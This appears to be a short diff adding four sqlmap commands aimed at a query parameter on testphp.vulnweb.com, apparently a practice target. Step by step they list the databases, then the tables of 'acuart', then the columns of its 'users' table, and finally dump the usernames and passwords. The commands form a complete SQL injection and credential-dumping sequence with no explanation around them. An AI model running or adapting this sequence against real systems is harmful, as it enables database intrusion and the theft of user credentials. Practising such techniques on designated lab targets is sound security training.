@@ -1,0 +1,4 @@
+sqlmap -u "https://testphp.vulnweb.com/listproducts.php?cat=1" --batch --dbs
+sqlmap -u "https://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
+sqlmap -u "https://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns
+sqlmap -u "https://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C username,password --dump
